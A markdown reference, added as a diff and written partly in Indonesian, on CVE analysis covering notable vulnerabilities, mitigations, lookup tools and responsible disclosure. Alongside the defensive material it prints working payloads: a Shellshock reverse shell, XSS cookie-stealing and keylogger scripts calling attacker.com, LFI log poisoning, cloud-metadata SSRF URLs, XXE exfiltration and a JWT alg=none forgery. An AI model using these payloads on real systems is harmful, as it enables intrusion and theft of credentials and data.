@@ -1,0 +1,376 @@
+# CVE Analysis & Mitigation Reference
+
+## Cara Membaca CVE
+
+**Format**: CVE-[YEAR]-[NUMBER]
+- CVE-2021-44228 = tahun 2021, nomor 44228
+- Database resmi: https://nvd.nist.gov/vuln/search
+- Alternatif: https://cvedetails.com, https://vulners.com
+
+**CVSS v3.1 Score Components**:
+- AV (Attack Vector): Network(N) > Adjacent(A) > Local(L) > Physical(P)
+- AC (Attack Complexity): Low(L) > High(H)
+- PR (Privileges Required): None(N) > Low(L) > High(H)
+- UI (User Interaction): None(N) > Required(R)
+- S (Scope): Changed(C) > Unchanged(U)
+- C/I/A (Impact): High(H) > Low(L) > None(N)
+
+---
+
+## CVE Paling Kritikal per Kategori
+
+### 1. Remote Code Execution (RCE)
+
+**CVE-2021-44228 — Log4Shell (Log4j)**
+- CVSS: 10.0 CRITICAL
+- Produk: Apache Log4j 2.x (digunakan oleh ribuan aplikasi Java)
+- Vector: Attacker kirim string `${jndi:ldap://attacker.com/exploit}` ke field yang di-log
+- Impact: Full RCE tanpa autentikasi, attack surface sangat luas
+- Mitigasi: Update ke Log4j 2.17.1+, set `log4j2.formatMsgNoLookups=true`
+- Deteksi: Scan log untuk pattern `${jndi:`, `${${::-j}${::-n}${::-d}${::-i}:`
+
+**CVE-2021-26084 — Confluence OGNL Injection**
+- CVSS: 9.8 CRITICAL
+- Produk: Atlassian Confluence Server & Data Center
+- Vector: HTTP POST ke `/pages/doenterpagevariables.action` tanpa auth
+- Impact: Arbitrary command execution sebagai Confluence service user
+- Mitigasi: Patch ke 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0+
+
+**CVE-2019-0708 — BlueKeep (RDP)**
+- CVSS: 9.8 CRITICAL
+- Produk: Windows 7, Server 2003/2008, XP (RDP service)
+- Vector: Unauthenticated RDP packet, wormable (seperti EternalBlue)
+- Impact: Full SYSTEM shell tanpa kredensial
+- Mitigasi: Patch MS19-0708, disable RDP jika tidak dibutuhkan, enable NLA
+
+**CVE-2017-0144 — EternalBlue (MS17-010)**
+- CVSS: 9.3 HIGH
+- Produk: Windows SMBv1
+- Vector: Crafted SMB packet ke port 445
+- Impact: Full SYSTEM RCE, dipakai WannaCry dan NotPetya ransomware
+- Mitigasi: Disable SMBv1, patch MS17-010, block port 445 di perimeter
+
+**CVE-2014-6271 — Shellshock (Bash)**
+- CVSS: 10.0 CRITICAL
+- Produk: Bash < 4.3 (semua sistem Unix/Linux dengan CGI)
+- Vector: `env x='() { :;}; echo vulnerable' bash -c "echo test"`
+- Payload via HTTP: `User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1`
+- Mitigasi: Update bash ke versi terbaru
+
+---
+
+### 2. SQL Injection
+
+**CVE-2012-1823 — PHP CGI Argument Injection**
+- CVSS: 7.5 HIGH
+- Produk: PHP < 5.3.12/5.4.2 dalam mode CGI
+- Vector: `http://target.com/index.php?-s` → source code disclosure
+- Exploit: `?-d allow_url_include=On -d auto_prepend_file=php://input` + PHP payload in POST
+
+**General SQLi Detection**:
+```
+# Error-based (MySQL)
+' AND extractvalue(1,concat(0x7e,version()))--
+
+# Boolean blind
+' AND 1=1-- (true)
+' AND 1=2-- (false)
+
+# Time-based blind
+' AND SLEEP(5)--     (MySQL)
+'; WAITFOR DELAY '0:0:5'--  (MSSQL)
+
+# Detection tools
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables
+```
+
+**Mitigasi SQLi**:
+- Parameterized queries / Prepared statements
+- ORM (SQLAlchemy, Hibernate, Active Record)
+- Least privilege database accounts
+- WAF sebagai defense-in-depth
+
+---
+
+### 3. Cross-Site Scripting (XSS)
+
+**CVE-2020-11022 / CVE-2020-11023 — jQuery XSS**
+- CVSS: 6.9 MEDIUM
+- Produk: jQuery < 3.5.0
+- Vector: `$.html()`, `$.append()`, `$.prepend()` dengan input tidak sanitized
+- Payload: `<img src=x onerror=alert(1)>` via jQuery DOM manipulation
+- Mitigasi: Update jQuery ke 3.5.0+, gunakan `.text()` bukan `.html()` untuk untrusted input
+
+**Stored XSS Exploitation**:
+```javascript
+// Cookie stealing
+<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
+
+// Keylogger
+<script>
+document.onkeypress=function(e){
+  fetch('https://attacker.com/key?k='+e.key);
+}
+</script>
+
+// BeEF hook (browser exploitation framework)
+<script src="http://attacker.com/hook.js"></script>
+
+// Defacement
+<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
+```
+
+**Mitigasi XSS**:
+- Output encoding (HTML entity encoding)
+- Content-Security-Policy: `default-src 'self'`
+- X-XSS-Protection: 1; mode=block (legacy)
+- DOMPurify untuk sanitize HTML input
+- HttpOnly cookie flag
+- Avoid `innerHTML`, `eval()`, `document.write()`
+
+---
+
+### 4. Path Traversal / LFI
+
+**CVE-2021-41773 — Apache Path Traversal & RCE**
+- CVSS: 7.5 HIGH (9.8 jika mod_cgi aktif)
+- Produk: Apache HTTP Server 2.4.49
+- Vector: `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1`
+- Impact: Read arbitrary files; RCE jika mod_cgi aktif
+- Mitigasi: Update ke 2.4.51+, atau set `Require all denied` di `<Directory />`
+
+**CVE-2019-18935 — Telerik UI RCE (Deserialization)**
+- CVSS: 9.8 CRITICAL
+- Produk: Telerik UI for ASP.NET AJAX < R1 2020
+- Vector: Path traversal ke file upload + deserialization
+- Mitigasi: Patch ke R1 2020 (2020.1.114)+, disable Telerik upload handler
+
+**LFI Exploitation Techniques**:
+```
+# Basic LFI
+?page=../../../../etc/passwd
+?file=../../../windows/system32/drivers/etc/hosts
+
+# PHP Wrapper
+?file=php://filter/convert.base64-encode/resource=/etc/passwd
+?file=data://text/plain,<?php system($_GET['cmd']);?>
+
+# Log Poisoning → RCE
+# 1. Poison User-Agent
+curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
+# 2. Include log
+?file=../../../../var/log/apache2/access.log&cmd=id
+
+# /proc leakage
+?file=/proc/self/environ
+?file=/proc/self/cmdline
+```
+
+---
+
+### 5. SSRF (Server-Side Request Forgery)
+
+**CVE-2021-22986 — F5 BIG-IP iControl SSRF → RCE**
+- CVSS: 9.8 CRITICAL
+- Produk: BIG-IP (iControl REST API)
+- Vector: Unauthenticated POST ke `/mgmt/tm/util/bash`
+- Impact: Remote Code Execution sebagai root
+
+**CVE-2019-9193 — PostgreSQL SSRF/RCE via COPY**
+- Produk: PostgreSQL dengan superuser privileges
+- Vector: `COPY TO/FROM PROGRAM 'command'`
+
+**SSRF Exploitation**:
+```
+# AWS metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP metadata
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+Header: Metadata-Flavor: Google
+
+# Internal service scan
+http://192.168.1.1/
+http://10.0.0.1:8080/admin
+
+# Bypass filter
+http://127.0.0.1 → http://[::1] (IPv6)
+http://127.0.0.1 → http://0x7f000001 (hex)
+http://127.1 (short form)
+DNS rebinding attack
+```
+
+---
+
+### 6. Deserialization
+
+**CVE-2017-9805 — Apache Struts2 RCE**
+- CVSS: 9.8 CRITICAL
+- Produk: Apache Struts 2.3.x < 2.3.34, 2.5.x < 2.5.13
+- Vector: REST plugin dengan malicious Content-Type XML
+- Payload: `Content-Type: application/x-www-form-urlencoded` dengan OGNL injection
+
+**CVE-2015-4852 — Oracle WebLogic Deserialization**
+- CVSS: 9.8 CRITICAL
+- Produk: Oracle WebLogic Server
+- Vector: T3 protocol, unauthenticated deserialization via `java.rmi`
+
+**Java Deserialization Exploitation**:
+```bash
+# ysoserial — generate payloads
+java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
+
+# Test with Burp Deserialization Scanner plugin
+# Check for: ObjectInputStream.readObject() calls
+# Detect: Content-Type: application/x-java-serialized-object
+# Binary signature: AC ED 00 05 (hex) = aced0005
+```
+
+---
+
+### 7. Authentication Bypass
+
+**CVE-2020-1472 — Zerologon (Netlogon)**
+- CVSS: 10.0 CRITICAL
+- Produk: Windows Domain Controllers (netlogon service)
+- Vector: Exploit cryptographic flaw → set DC computer account password to blank
+- Impact: Full domain takeover, domain admin access
+- Mitigasi: Patch MS20-1472 (August 2020 CU)
+
+**CVE-2021-40539 — ManageEngine ADSelfService Plus Auth Bypass**
+- CVSS: 9.8 CRITICAL
+- Produk: Zoho ManageEngine ADSelfService Plus
+- Vector: REST API endpoint auth bypass → SAML exploitation
+
+**JWT Common Weaknesses**:
+```python
+# 1. Algorithm confusion: RS256 → HS256
+# Use public key as HMAC secret
+
+# 2. alg=none bypass
+import base64, json
+header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode()
+payload = base64.b64encode(json.dumps({"user":"admin"}).encode()).decode()
+token = f"{header}.{payload}."  # empty signature
+
+# 3. Weak secret brute force
+hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
+
+# 4. kid injection (SQL)
+{"kid": "' UNION SELECT 'attackerkey' --"}
+```
+
+---
+
+### 8. XXE (XML External Entity)
+
+**CVE-2019-3396 — Confluence Server XXE → SSRF → RCE**
+- CVSS: 9.8 CRITICAL
+- Vector: Widget Connector macro with specially crafted XML
+- Impact: Read arbitrary files, SSRF to internal services, RCE via template injection
+
+**XXE Payloads**:
+```xml
+<!-- Basic file read -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+<!-- SSRF via XXE -->
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+
+<!-- Blind XXE via DNS exfiltration -->
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
+  %dtd;
+]>
+```
+
+**Mitigasi XXE**:
+- Disable external entity processing: `FEATURE_EXTERNAL_GENERAL_ENTITIES = false`
+- Use JSON instead of XML where possible
+- Input validation on XML input
+- Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
+
+---
+
+### 9. IDOR (Insecure Direct Object Reference)
+
+**No specific CVE — application logic flaw. CVSS varies.**
+
+**Exploitation Patterns**:
+```
+# Change numeric ID
+GET /api/invoice/1234 → try 1235, 1236
+GET /user/profile/john → try /user/profile/admin
+
+# Change UUID (sometimes predictable)
+GET /download?file_id=abc123-...
+
+# Change role parameter in request body
+{"user_id": 5, "role": "user"} → {"user_id": 5, "role": "admin"}
+
+# Mass assignment
+PATCH /api/user/update
+{"name": "John", "email": "x@x.com", "is_admin": true}
+```
+
+**Tools**:
+- Burp Suite Autorize extension: automatically test IDOR
+- Param Miner: discover hidden parameters
+
+---
+
+### 10. CVE Lookup & Tracking Tools
+
+**Free Resources**:
+```
+NVD (National Vulnerability Database): https://nvd.nist.gov/vuln/search
+CVE Details: https://www.cvedetails.com
+Exploit-DB: https://www.exploit-db.com
+Vulhub (Docker PoC labs): https://github.com/vulhub/vulhub
+Nuclei Templates: https://github.com/projectdiscovery/nuclei-templates
+```
+
+**CLI Tools**:
+```bash
+# Search ExploitDB locally (Kali)
+searchsploit apache 2.4.49
+
+# Download specific exploit
+searchsploit -m 50383
+
+# CVE feed via API (NVD)
+curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=log4j&resultsPerPage=5"
+
+# Scan for known CVEs
+nuclei -u https://target.com -t cves/
+
+# Trivy — scan container images
+trivy image nginx:1.19
+```
+
+**CVSS Calculator**:
+https://www.first.org/cvss/calculator/3.1
+
+---
+
+## Vulnerability Disclosure Timeline (Responsible Disclosure)
+
+1. **Temukan vuln** → dokumentasikan dengan PoC
+2. **Contact vendor** → email ke security@vendor.com atau via HackerOne/Bugcrowd
+3. **Tunggu response** → biasanya 7 hari untuk acknowledgement
+4. **Koordinasi fix** → standard 90 hari (Google Project Zero policy)
+5. **Public disclosure** → setelah patch dirilis atau 90 hari berlalu
+6. **CVE Assignment** → request via MITRE atau CNA (CVE Numbering Authority)
+
+**Jangan lakukan**:
+- Publish exploit sebelum vendor punya waktu untuk patch
+- Test di production system tanpa izin tertulis
+- Akses data user selain yang dibutuhkan untuk PoC
+- Demand pembayaran tanpa program bug bounty resmi (itu extortion)
